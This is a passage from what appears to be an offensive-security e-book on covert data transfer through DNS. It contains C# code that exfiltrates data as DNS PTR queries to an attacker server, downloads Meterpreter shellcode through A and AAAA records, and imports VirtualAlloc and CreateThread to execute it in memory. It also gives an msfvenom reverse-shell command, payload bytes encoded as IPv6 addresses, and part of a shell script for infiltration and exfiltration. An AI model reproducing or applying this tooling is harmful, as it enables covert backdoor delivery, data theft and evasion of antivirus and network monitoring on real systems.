1));\n\r\n\r                    Final_DNS_Text_File += nique.Substring(0, nique.Length - 1) + \" \" + String_DomainName + \" \\r\\n\";\n\r\n\r                    nique = \"\";\n\r\n\r                    Display_counter++;\n\r\n\r                    \n\r\n\r                }\n\r\n\r                Console.WriteLine();\n\r\n\r                if (!Is_exfiltration_Mode)\n\r\n\r                {\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                    Console.WriteLine(\"Copy these A Records to /etc/hosts or DNS.TXT for Using by Dnsmasq tool\");\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    Console.WriteLine(Final_DNS_Text_File);\n\r\n\r                }\n\r\n\r                if (Is_exfiltration_Mode)\n\r\n\r                {\n\r\n\r                    return Final_DNS_Text_File;\n\r\n\r                }\n\r\n\r            }\n\r\n\r            return Final_DNS_Text_File;\n\r\n\r        }\n\r\n\r      \n\r\n\r        public static byte[] __nslookup(string Exfiltration_String, string DnsServer, bool Is_Exfiltration_Mode, Int32 min, Int32 max)\n\r\n\r        {\n\r\n\r            if (Is_Exfiltration_Mode)\n\r\n\r            {\n\r\n\r                if (min &gt; max)\n\r\n\r                {\n\r\n\r                    Int32 t = min;\n\r\n\r                    min = max;\n\r\n\r                    max = t;\n\r\n\r                }\n\r\n\r               \n\r\n\r                string Temp_Hex = \"\";\n\r\n\r                int CheckLength = 0;\n\r\n\r \n\r\n\r                if (Is_4_OctetsMode)\n\r\n\r                {\n\r\n\r                    CheckLength = Exfiltration_String.Length % 4;\n\r\n\r                    /// debug error\n\r\n\r                    // Console.WriteLine(\"err value: {0}\", CheckLength);\n\r\n\r                }\n\r\n\r                else if (!Is_4_OctetsMode)\n\r\n\r                {\n\r\n\r                    CheckLength = Exfiltration_String.Length % 3;\n\r\n\r                    /// debug error\n\r\n\r                    // Console.WriteLine(\"err value: {0}\", CheckLength);\n\r\n\r                }\n\r\n\r \n\r\n\r                if (!Is_4_OctetsMode &amp;&amp; CheckLength == 1) Exfiltration_String += \"  \";\n\r\n\r                \n\r\n\r                if (!Is_4_OctetsMode &amp;&amp; CheckLength == 2 ) Exfiltration_String += \" \";\n\r\n\r                \n\r\n\r                if (Is_4_OctetsMode &amp;&amp; (CheckLength == 2 || CheckLength == 3)) Exfiltration_String += \"  \";\n\r\n\r \n\r\n\r                if (Is_4_OctetsMode &amp;&amp; CheckLength == 1) Exfiltration_String += \"   \";\n\r\n\r \n\r\n\r \n\r\n\r                foreach (char P in Exfiltration_String)\n\r\n\r                {\n\r\n\r                    int tmp = P;\n\r\n\r                    Temp_Hex += string.Format(\"{0:x2}\", (Int32)Convert.ToInt32(tmp.ToString())) + \",\";\n\r\n\r                }\n\r\n\r \n\r\n\r                string Exfiltration_Data = \"\";\n\r\n\r                if (Is_4_OctetsMode)\n\r\n\r                {\n\r\n\r                    /// Mode : 4 octets {w.x.y.z} is our payload\n\r\n\r                    Exfiltration_Data = SortIPAddress(Temp_Hex, \"Null\", true, true);\n\r\n\r                }\n\r\n\r                else if (!Is_4_OctetsMode)\n\r\n\r                {\n\r\n\r                    /// Mode : 3 octets {w.x.y}.Z , {w x y} is our payload and Z is our counter\n\r\n\r                    Exfiltration_Data = SortIPAddress(Temp_Hex, \"0\", \"Null\", true);\n\r\n\r                }\n\r\n\r \n\r\n\r                string[] PTR_Records = Exfiltration_Data.Split(\'\\n\');                \n\r\n\r                var random = new Random();\n\r\n\r               \n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                Console.WriteLine(\"[!] {0} Exfiltration Started\", DateTime.Now.ToString());\n\r\n\r                Console.WriteLine(\"[!] Uploading DATA by Sending {0} PTR Request to DNS Server {1} \", (PTR_Records.Length - 1).ToString(), DnsServer);\n\r\n\r                Console.WriteLine(\"[!] DNS Request will send by Random Time with : min {0} , max {1} MilliSeconds\", min.ToString(), max.ToString());\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                int RequestCounter = 1;\n\r\n\r                foreach (string item in PTR_Records)\n\r\n\r                {\n\r\n\r \n\r\n\r                    try\n\r\n\r                    {\n\r\n\r                        if (item != \"\")\n\r\n\r                        {\n\r\n\r                            \n\r\n\r                            /// Make DNS traffic for getting Meterpreter Payloads by nslookup\n\r\n\r                            ProcessStartInfo ns_Prcs_info = new ProcessStartInfo(\"nslookup.exe\", item.Split(\' \')[0] + \" \" + DnsServer);\n\r\n\r                            ns_Prcs_info.RedirectStandardInput = true;\n\r\n\r                            ns_Prcs_info.RedirectStandardOutput = true;\n\r\n\r                            ns_Prcs_info.RedirectStandardError = false;\n\r\n\r                            ns_Prcs_info.UseShellExecute = false;\n\r\n\r                            /// you can use Thread Sleep here \n\r\n\r                            System.Threading.Thread.Sleep(random.Next(min, max));\n\r\n\r                            Process nslookup = new Process();\n\r\n\r                            nslookup.StartInfo = ns_Prcs_info;\n\r\n\r                            nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\r\n\r                            nslookup.Start();\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                            Console.WriteLine(\"[&gt;] {0} , {1} , DATA Uploading by Sending DNS PTR Record Request : {2}\", RequestCounter.ToString(), DateTime.Now.ToString(), item.Split(\' \')[0]);\n\r\n\r                            Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                            RequestCounter++;\n\r\n\r                        }\n\r\n\r \n\r\n\r                    }\n\r\n\r                    catch (Exception err)\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                        Console.WriteLine(\"[x] \" + err.Message);\n\r\n\r                    }\n\r\n\r \n\r\n\r                }\n\r\n\r                \n\r\n\r            }\n\r\n\r            System.Threading.Thread.Sleep(2500);\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            return null;\n\r\n\r        }\n\r\n\r        /// &lt;summary&gt;\n\r\n\r        /// Ver 2.0 \n\r\n\r        /// reversing this Technique by PTR Records for exfiltration (Uploading) DATA to DNS server\n\r\n\r        /// Adding Exfiltration Feature for Uploading DATA by DNS PTR Records to Attacker DNS Server \n\r\n\r        /// in this case for reading these Exfiltrated DATA , you need to read DNSMASQ Log-file by switch \n\r\n\r        /// End\n\r\n\r        /// &lt;/summary&gt;\n\r\n\r \n\r\n\r        //public static string _Records;\n\r\n\r \n\r\n\r        public static byte[] __nslookup(string DNS_PTR_A, string DnsServer)\n\r\n\r        {\n\r\n\r            /// Make DNS traffic for getting Meterpreter Payloads by nslookup\n\r\n\r            ProcessStartInfo ns_Prcs_info = new ProcessStartInfo(\"nslookup.exe\", DNS_PTR_A + \" \" + DnsServer);\n\r\n\r            ns_Prcs_info.RedirectStandardInput = true;\n\r\n\r            ns_Prcs_info.RedirectStandardOutput = true;\n\r\n\r            ns_Prcs_info.UseShellExecute = false;\n\r\n\r            /// you can use Thread Sleep here \n\r\n\r \n\r\n\r            Process nslookup = new Process();\n\r\n\r            nslookup.StartInfo = ns_Prcs_info;\n\r\n\r            nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\r\n\r            nslookup.Start();\n\r\n\r \n\r\n\r       \n\r\n\r            string computerList = nslookup.StandardOutput.ReadToEnd();\n\r\n\r           \n\r\n\r            string[] lines = computerList.Split(\'\\r\', \'n\');\n\r\n\r            int ID = 0;\n\r\n\r            foreach (var item in lines)\n\r\n\r            {\n\r\n\r                if (item.Contains(DNS_PTR_A))\n\r\n\r                {\n\r\n\r                    break;\n\r\n\r                }\n\r\n\r                ID++;\n\r\n\r            }\n\r\n\r            List&lt;string&gt; A_Records = new List&lt;string&gt;();\n\r\n\r            try\n\r\n\r            {\n\r\n\r \n\r\n\r                int FindID_FirstAddress = ID + 1;\n\r\n\r                string last_line = lines[lines.Length - 3];\n\r\n\r              \n\r\n\r                A_Records.Add(lines[FindID_FirstAddress].Split(\':\')[1].Substring(2));\n\r\n\r                for (int iq = FindID_FirstAddress + 1; iq &lt; lines.Length - 2; iq++)\n\r\n\r                {\n\r\n\r                    A_Records.Add(lines[iq].Substring(4));                   \n\r\n\r                }\n\r\n\r            }\n\r\n\r            catch (Exception e1)\n\r\n\r            {\n\r\n\r                Console.WriteLine(\"error 1: {0}\", e1.Message);\n\r\n\r            }\n\r\n\r            /// Debug\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"[!] Debug Mode [ON]\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"[!] DNS Server Address: {0}\", DnsServer);\n\r\n\r            Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r            Console.WriteLine(\"[&gt;] Downloading Meterpreter Payloads or Text Data by ({1}) DNS A Records for Domain Name : {0}\", DNS_PTR_A, A_Records.Count.ToString());\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r            foreach (var item3 in A_Records)\n\r\n\r            {\n\r\n\r                Console.Write(\"[{0}] , \",item3.ToString());\n\r\n\r                \n\r\n\r            }\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r \n\r\n\r            int serial = 0;\n\r\n\r            string[] obj = new string[4];\n\r\n\r \n\r\n\r            /// X.X.X * Y = Payload length; so A_Records * 3 is your Payload Length ;)\n\r\n\r            byte[] XxXPayload = new byte[A_Records.Count * 3];\n\r\n\r \n\r\n\r            Int32 Xnumber = 0;\n\r\n\r \n\r\n\r            for (int Onaggi = 1; Onaggi &lt;= A_Records.Count; Onaggi++)\n\r\n\r            {\n\r\n\r \n\r\n\r                foreach (var item in A_Records)\n\r\n\r                {\n\r\n\r                    obj = item.Split(\'.\');\n\r\n\r                    serial = Convert.ToInt32(item.Split(\'.\')[3]);\n\r\n\r                    if (serial == Onaggi)\n\r\n\r                    {\n\r\n\r                        XxXPayload[Xnumber] = Convert.ToByte(obj[0]);\n\r\n\r                        XxXPayload[Xnumber + 1] = Convert.ToByte(obj[1]);\n\r\n\r                        XxXPayload[Xnumber + 2] = Convert.ToByte(obj[2]);\n\r\n\r \n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r \n\r\n\r                        break;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r            }\n\r\n\r           \n\r\n\r            return XxXPayload;\n\r\n\r \n\r\n\r        }\n\r\n\r        private static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r    }\n\r\n\r}","","topics\\Chapter 5.html","\n\r\n\r \n\r\n\rChapter 6 : DATA Transferring Technique by DNS Traffic (AAAA Records)\n\r\n\r\n\r•Goal : Understanding this technique by C# \n\r\n\r\n\r•Demo : C# Code “NativePayload_IP6DNS” Step by step. \n\r\n\r\n\r \n\r\n\r \n\r\n\rPART1 , Understanding this technique by C# \n\r\n\rIn this chapter I want to explain how can Download DATA from Attacker Server via DNS AAAA records and DNS Traffic so this is one way for DATA “Infiltration” also one way for Downloading “Backdoor Payload” via DNS Traffic and bypassing Detection by AVs etc. \n\r\n\rAgain Why DNS protocol?\n\r\n\rBecause DNS traffic in the most networks are available without monitoring or Filtering by IPS/IDS or hardware firewalls .In this article I want to show you one way for “Infiltration or Downloading” DATA by DNS Request in this case by “AAAA Records” over Network.\n\r\n\rHow you can do this ?\n\r\n\rin this article i want to explain how can use IPv6 Address (AAAA) records in DNS traffic for Transferring Payloads. In previous Chapter I explained how can use DNS and PTR Records , now We should talk about IPv6 Addresses and AAAA records .\n\r\n\rThis chapter has 2 Parts :\n\r\n\r\n\r•PART I : DNS AAAA records and ICMPv6  \n\r\n\r\n\r•PART II : DNS and AAAA records (large DNS AAAA records Response)  \n\r\n\r\n\rPART I: DNS AAAA records and ICMPv6\n\r\n\rIPv6 address is really good thing for transferring Payloads also injecting Data as IPv6 Addresses let me explain how can do this very simple.\n\r\n\rFor example we have one IPv6 address like this :\n\r\n\rfe80:1111:0034:abcd:ef00:ab11:ccf1:0000\n\r\n\rin this case we can use these “xxxx” sections of IPv6 Address for our Payloads .\n\r\n\rfe80:1111:xxxx:xxxx:xxxx:xxxx:xxxx:wxyz\n\r\n\rI think we have 2 ways for using this IPv6 address as Payloads first we can use DNS and AAAA records and second is Using these IPv6 Addresses and DNS AAAA record also ICMPv6 Traffic by Ping6 . \n\r\n\rICMPv6 and Ping6 : in this case you can change Attacker IPv6 Address by Fake IPv6 address with Injected Payload then from Backdoor system you can get these IPv6 addresses by Ping6 loop (ICMPv6 traffic)\n\r\n\rso we have something like this :\n\r\n\r(backdoor system) ipaddress = {192.168.1.120}\n\r\n\r(attacker system) ipaddress = {192.168.1.111 ,fe80:1111:0034:abcd:ef00:ab11:ccf1:0000}\n\r\n\r(attacker system) DNS name = test.domain.com , and DNS service Installed (dnsmasq)\n\r\n\rDNS AAAA records and ICMPv6 step by step :\n\r\n\rstep1 : (attacker DNS server) record0 =&gt;fe80:1111:0034:abcd:ef00:ab11:ccf1:0000 AAAA test.domain.com\n\r\n\rstep2 : (backdoor system) ==&gt; nslookup test.domain.com 192.168.1.111 \n\r\n\rstep3 : (backdoor system) loop Ping6 =&gt; (Attacker system fe80:1111:0034:abcd:ef00:ab11:ccf1:0000)\n\r\n\rstep4 : (backdoor system) dump Injected Payloads in IPv6 Address by Ping6 Response , dumping these sections {0034:abcd:ef00:ab11:ccf1}\n\r\n\rstep5 : (attacker DNS server) record0 change to new AAAA for test.domain.com\n\r\n\rstep6 : (attacker DNS server) record1 =&gt;fe80:1111:cf89:abff:000e:09b1:33b1:0001 AAAA test.domain.com\n\r\n\rstep6-1 : (attacker system) Adding or changed NIC IPv6 address by ifconfig eth0 { NewIPv6 Address : fe80:1111:cf89:abff:000e:09b1:33b1:0001 }\n\r\n\rstep6-2 : ping6 response for step 3 = timeout or unreachable (error) ,this time is Flag for getting new IPv6 Address or probably your Traffic Detected by Something and Blocked.\n\r\n\rstep7 : (backdoor system) =&gt; nslookup test.domain.com 192.168.1.111\n\r\n\rstep8 : (backdoor system) loop Ping6 test.domain.com =&gt; {New IPv6 Address fe80:1111:cf89:abff:000e:09b1:33b1:0001}\n\r\n\rstep9 : (backdoor system) dump Injected Payloads from new IPv6 Address by Ping6 Response , dumping these sections : {cf89:abff:000e:09b1:33b1}\n\r\n\rNote1 : when we can figure out : IPv6 Address changed ? until ping6 response from Attacker system was like timeout or unreachable … also you can check this by Nslookup too.\n\r\n\rNote2 : also you can use multiple ipv6 address for Attacker NIC in this case not necessary to step “6-1”. but in this time you can\'t use“Note 1:” so in this case you should use timer or Loop for dumping new ipv6 address from attacker system by nslookup tool or something like that .it means from Backdoor system you can get line by line IPv6 address for Attacker system by nslookup and DNS Round-robin feature and chunking IPv6 DNS names too.\n\r\n\rafter these Steps you have 20 bytes Payload by DNS and ICMPv6 traffic like these :\n\r\n\rpayload0= fe80:1111:0034:abcd:ef00:ab11:ccf1:0000 ==&gt; 0034:abcd:ef00:ab11:ccf1\n\r\n\rpayload1= fe80:1111:cf89:abff:000e:09b1:33b1:0001 ==&gt; cf89:abff:000e:09b1:33b1\n\r\n\rso we have this Payload after two Ping6 \n\r\n\rresponse:0034abcdef00ab11ccf1cf89abff000e09b133b1\n\r\n\rbut in this technique you can do this by DNS traffic only , it means you can remove all steps for Ping6 . So you can dump payload from DNS server by DNS response only via “step 2 and step 7” if you want to do this without Ping6 and ICMPv6 traffic . But we talk about this one in “PART2: Talking about DNS and AAAA records” (large packet)\n\r\n\rlet me show you some pictures about ICMPv6 Method without Code and tool .Picture: A \n\r\n\rin picture A you can see we have 8 AAAA records for DNS name “test.domain.com” also you can see Ping response for this IPv6 address , in this Technique DNS and ICMPv6 you can download DNS names by 1 or 2 request then you can use Ping6 for these IPv6 Address if you want to use ICMPv6 .\n\r\n\rIn picture A we have 8 AAAA records so we have 8 * 10 bytes = 80 bytes “Meterpreter Payload” .\n\r\n\rDNS AAAA Records : \n\r\n\rfe80:1111:fc48:83e4:f0e8:cc00:0000:ae0    test.domain.com\n\r\n\rfe80:1111:4151:4150:5251:5648:31d2:ae1   test.domain.com\n\r\n\rfe80:1111:6548:8b52:6048:8b52:1848:ae2   test.domain.com\n\r\n\rfe80:1111:8b52:2048:8b72:5048:0fb7:ae3   test.domain.com\n\r\n\rfe80:1111:4a4a:4d31:c948:31c0:ac3c:ae4   test.domain.com\n\r\n\rfe80:1111:617c:022c:2041:c1c9:0d41:ae5   test.domain.com\n\r\n\rfe80:1111:01c1:e2ed:5241:5148:8b52:ae6   test.domain.com\n\r\n\rfe80:1111:208b:423c:4801:d066:8178:ae7   test.domain.com\n\r\n\r \n\r\n\r \n\r\n\rMeterpreter Payloads : \n\r\n\rPAYLOAD0 = fc4883e4f0e8cc000000 and Counter = ae0\n\r\n\rPAYLOAD1 = 415141505251564831d2 and Counter = ae1\n\r\n\rso we have this payload = fc4883e4f0e8cc000000415141505251564831d2\n\r\n\rwhy Ping , when we can Get payloads by DNS request ?\n\r\n\r \n\r\n\rif you want to have DNS Request like DNS Request Loop or DNS Request with Large Response by AAAA records then probably it will be flag for Detecting by DNS Monitoring tools so if you have 1 or 2 ping6 traffic for each AAAA record after each DNS AAAA Response then I think it will be “Normal traffic” and Risk to detecting by DNS Monitoring Device or DNS Monitoring Tools is very low .\n\r\n\rFor example you can use one Request with one Response by 1 or 2 or 3 AAAA records only . It means if your Response had 4 AAAA records or more than 4 AAAA records then maybe this will be flag to Detecting your Traffic by Network monitoring Device/Tools but SOC/NOC Guys better than me can talk about these Restriction rules for networks .\n\r\n\rAs you can see in picture A the request for test.domain.com has “8 AAAA Records“ by Nslookup DNS Response.\n\r\n\rSo in this case you Should/Can chunk these payloads via injecting them to IPv6 addresses also DNS names too .\n\r\n\rLet me explain something about ICMPv6 , if you want to ping one system by IPV6 address , first you should get IPv6 address for that system, so you need DNS request always . Important Point is how much DNS request you need for Dumping all IPv6 Address also Dumping Injected Meterpreter Payloads by IPv6 addresses ? \n\r\n\rOne Request ? \n\r\n\rIf you want to have All IPv6 Addresses by one Request and one Response then you will have one Response with too much AAAA records in DNS Response , so risk to detecting is high .\n\r\n\rlike picture A1: \n\r\n\rPicture A1:\n\r\n\rand in the next picture A2 you can see length for two request “first small Response , second large response”. \n\r\n\rPicture A2: as you can see in picture A2 we have two DNS AAAA Response first has 132 length (small Response) and second has 1503 length (large Response)\n\r\n\rI will explain in this article About one Request and one Response for Dumping all IPv6 Addresses by DNS AAAA Records like Second Response in Picture A2 , but in this case we talk about DNS + ICMPv6 method also risk about Detecting Large DNS Response , as you can see in Picture A2 we have Second Response with Large Length and with this Length Risk to Detection by DNS Monitor Tools is high .\n\r\n\rTwo Request or More than two Request ?\n\r\n\ras you can see in picture B my payloads are in 3 DNS name {test0.domain.com , test1.domain.com , test2.domain.com}\n\r\n\rand I have ping6 one time for each IPv6 Address with “100% Ping Reply“.\n\r\n\rSo in this example we have 3 Request and 3 Response with two AAAA records for each response also we have ICMPv6 traffic after each DNS AAAA Response and finally we have small length for DNS response too.\n\r\n\r \n\r\n\rPicture B: \n\r\n\rNote: I have Multiple IPv6 Address on Linux system for Ping6 Reply like picture C.\n\r\n\ryou can do “STEP 6-1” by “Ifconfig” or “using Multiple IPv6 Address for NIC” like picture C.\n\r\n\r  \n\r\n\rPicture C: \n\r\n\rand this is our DNS queries like picture C1: \n\r\n\r \n\r\n\rPicture C1:\n\r\n\rnow you can see in picture D another example for chunking request and response .\n\r\n\r Picture D: \n\r\n\ralso you can see in Picture E our DNS server Log for DNS Request and Response too\n\r\n\r Picture E: \n\r\n\rOne trick : you can do this Method with this trick : “Injecting Next DNS Names as IPv6 Addresses”\n\r\n\rit means , step by step\n\r\n\r\n\r\n\r\n\r\n\r \n\r\n\rDNSMASQ DNS AAAA Records file “dnsmasq.hosts”\n\r\n\rfe80:1111:fc48:83e4:f0e8:cc00:0000:ae0    test.domain.com        &lt;=== Payload 0\n\r\n\r        # echo test2.domain.com | xxd -c 16\n\r\n\r        # 0000000: 7465 7374 322e 646f 6d61 696e 2e63 6f6d  test2.domain.com\n\r\n\r        # 0000010: 0a  \n\r\n\r7465:7374:322e:646f:6d61:696e:2e63:6f6d   test.domain.com      &lt;=== Non-Payload record (Address for next DnsName)\n\r\n\r \n\r\n\rfe80:1111:4151:4150:5251:5648:31d2:ae1   test2.domain.com        &lt;=== Payload 1\n\r\n\r        # echo test3.domain.com | xxd -c 16\n\r\n\r        # 0000000: 7465 7374 332e 646f 6d61 696e 2e63 6f6d  test3.domain.com\n\r\n\r        # 0000010: 0a  \n\r\n\r7465:7374:332e:646f:6d61:696e:2e63:6f6d   test2.domain.com     &lt;=== Non-Payload record (Address for next DnsName)\n\r\n\r \n\r\n\rfe80:1111:6548:8b52:6048:8b52:1848:ae2   test3.domain.com       &lt;=== Payload 2\n\r\n\rfe80:1111:8b52:2048:8b72:5048:0fb7:ae3   test0.domain2.com\n\r\n\rfe80:1111:4a4a:4d31:c948:31c0:ac3c:ae4   test1.domain3.com\n\r\n\rfe80:1111:617c:022c:2041:c1c9:0d41:ae5   test2.domain3.com\n\r\n\rfe80:1111:01c1:e2ed:5241:5148:8b52:ae6   test.domain4.com\n\r\n\rfe80:1111:208b:423c:4801:d066:8178:ae7   test.domain5.com\n\r\n\r \n\r\n\rso we have these 5 Records for 3 line payload in DNS.txt file for using by DNSMASQ “/etc/hosts”\n\r\n\rfe80:1111:fc48:83e4:f0e8:cc00:0000:ae0    test.domain.com \n\r\n\r7465:7374:322e:646f:6d61:696e:2e63:6f6d   test.domain.com\n\r\n\rfe80:1111:4151:4150:5251:5648:31d2:ae1   test2.domain.com\n\r\n\r7465:7374:332e:646f:6d61:696e:2e63:6f6d   test2.domain.com\n\r\n\rfe80:1111:6548:8b52:6048:8b52:1848:ae2   test3.domain.com\n\r\n\r \n\r\n\rwith this  trick always with Nslookup “test.domain.com” you will have Next DNS Name in this case “test2.domain.com” so with first nslookup you will see what is next DNS Name for Next nslookup and with next nslookup “test2.domain.com” you will figure out what is next DNS name in this case “test3.domain.com” etc.... , anyway , as you can see by these Pictures this Method is possible Technically .\n\r\n\r \n\r\n\rPART II: DNS and AAAA records “Large DNS AAAA Records Response”\n\r\n\rNow I want to talk about DNS and AAAA records and how can get these payloads by one DNS Request and one DNS Response from Fake DNS server to “Backdoor system”. So we talking about Large AAAA Response , it means after one DNS Response you can have all payload in Backdoor system also you have Meterpreter session via DNS AAAA Response.\n\r\n\rStep by step “Transferring/Dowloading” Backdoor Payloads with DNS AAAA Records by NativePaylaod_IP6DNS tool:\n\r\n\rstep1: making FakeDnsServer with Hosts file .\n\r\n\rin this case for “Attacker system” I want to use dnsmasq tool and dnsmasq.hosts file .\n\r\n\rBefore make this file you need payload so with this command you can have one payload.\n\r\n\rMsfvenom  --arch x86_64  --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 -f c &gt;/payload.txt\n\r\n\rNote : in this case 192.168.1.50 is Attacker “Fake-DNS-Server” and Attacker “Metasploit listener” too \n\r\n\rnow you should make hosts file by this payload string like picture 1 ,you can make it with this syntax:\n\r\n\rNote : your payload (payload.txt) should changed from this format “0xfc,0x48,0x83” to this format : “fc4883...”\n\r\n\rsyntax1: NativePayload_IP6DNS.exe null fc48830034abcdef00ab11ccf1cf89abff000e09b133b1...Picture 1: \n\r\n\rnow you should copy these IPv6 addresses to DNS “Hosts” file like picture 2 and you need DNS name after each line of IPv6 address like Picture 2.Picture 2: \n\r\n\rin this case I want to use dnsmasq tool for DNS server so you can use “/etc/hosts” file or “/etc/dnsmasq.hosts”\n\r\n\rit depend on your configuration for dnsmasq tool .\n\r\n\rSo like picture 3 you can start your DNS server with this command.Picture 3: \n\r\n\rAfter running DNS Server your dnsmasq should read 51 Address from hosts file at least .\n\r\n\rFinally with this syntax you will have Meterpreter Session by one DNS IPv6 AAAA Records Response (one Large Response like Picture A2 , Second DNS response with 1503 length)\n\r\n\rSyntax: NativePayload_IP6DNS.exe “FQDN” “Fake DNS Server”\n\r\n\rSyntax: NativePayload_IP6DNS.exe test.domain.com 192.168.1.50Picture 4: \n\r\n\rusing this method and Linux systems (only)\n\r\n\rnow I want to talk about how can using this method via “NativePayload_IP6DNS.sh” script on (Linux systems only) so with this script by these syntaxes you can use IPv6 AAAA records and IPv6 PTR Queries to Exfil/Infil/Transferring DATA via DNS and IPv6 Addresses but in this Chapter we talked about AAAA records and with next “Chapter 7” we will talk about PTR Queries so let me show you These Syntaxes :\n\r\n\r NativePayload_IP6DNS.sh , Syntaxes :\n\r\n\r        Example A-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -r\n\r\n\r        Example A-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -u text.txt DNSMASQ_IPv4 [delay] (sec) [address] xxxx:xxxx\n\r\n\r        example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -r\n\r\n\r        example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -u text.txt 192.168.56.110 delay 0 address fe81:2222\n\r\n\r        Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via IPv6 PTR Queries to DNS server\n\r\n\r        \n\r\n\r        Example B-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -d makedns test.txt mydomain.com [address] xxxx:xxxx\n\r\n\r        Example B-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -d getdata mydomain.com DNSMASQ_IPv4\n\r\n\r        example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -d makedns text.txt google.com address fe80:1234\n\r\n\r        example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -d getdata google.com 192.168.56.110\n\r\n\r        Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via IPv6 AAAA record Query\n\r\n\r        \n\r\n\rin this “Chapter 6” we talked about “Example B-step1” and “Example B-step2” and in then next “Chapter 7” we will talk about “Example A” \n\r\n\r \n\r\n\rStep 1 :  with this step you can make a Fake DNS server to injecting your Text file as IPv6 Addresses via DNSMASQ and DnsHost.txt file by this Syntax :\n\r\n\r \n\r\n\rExample B-Step1: (Server Side) ./NativePayload_IP6DNS.sh -d makedns test.txt mydomain.com [address] xxxx:xxxx\n\r\n\r \n\r\n\r\n\r•./NativePayload_IP6DNS.sh -d makedns  mytext.txt  google.com  address  fe80:1111 \n\r\n\r\n\r \n\r\n\rStep 2 :  with this step you can Dump DNS IPv6 Addresses via Nslookup command From Server and finally you can have Text behind each IPv6 AAAA Record by this Syntax :\n\r\n\r        \n\r\n\rExample B-Step2: (Client Side) ./NativePayload_IP6DNS.sh -d getdata mydomain.com DNSMASQ_Ipv4\n\r\n\r        \n\r\n\r\n\r•./NativePayload_IP6DNS.sh -d getdata google.com 127.0.0.1 \n\r\n\r\n\r \n\r\n\r \n\r\n\ras you can see in the next Picture i had Text for \"mytext.txt\" File after Dumping AAAA records via \"Step-2\"  so in this case i used 127.0.0.1 but if you want to use this tool on two Separated Linux system then you should use Server Ipv4 address instead 127.0.0.1.\n\r\n\r  \n\r\n\rAt a glance : DNS traffic PTR Records and especially IPv6 AAAA Records are really good things for Transferring your Payload to bypassing Network Monitoring or Something like that , and with these techniques Anti-viruses bypassed too\n\r\n\rC# Source code for NativePayload_IP6DNS.exe tool : (DNS AAAA records)\n\r\n\rhttps://github.com/DamonMohammadbagher/NativePayload_IP6DNS\n\r\n\r \n\r\n\rNativePayload_IP6DNS.sh\n\r\n\r #!/bin/sh\n\r\n\recho\n\r\n\recho \"NativePayload_IP6DNS.sh , Published by Damon Mohammadbagher 2017-2018\" \n\r\n\recho \"Injecting/Downloading/Uploading DATA to DNS Traffic via IPv6 DNS AAAA/PTR Records\"\n\r\n\recho \"help syntax: ./NativePayload_IP6DNS.sh help\"\n\r\n\recho\n\r\n\r        if [ $1 == \"help\" ] \n\r\n\r        then\n\r\n\r        tput setaf 2;\n\r\n\r        echo\n\r\n\r        echo \"Example A-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -r\"\n\r\n\r        echo \"Example A-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -u text.txt DNSMASQ_IPv4 [delay] (sec) [address] xxxx:xxxx\"\n\r\n\r        echo \"example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -r\"\n\r\n\r        echo \"example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -u text.txt 192.168.56.110 delay 0 address fe81:2222\"\n\r\n\r        echo \"Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via IPv6 PTR Queries to DNS server\"\n\r\n\r        echo\n\r\n\r        echo \"Example B-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -d makedns test.txt mydomain.com [address] xxxx:xxxx\"\n\r\n\r        echo \"Example B-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -d getdata mydomain.com DNSMASQ_IPv4\"\n\r\n\r        echo \"example 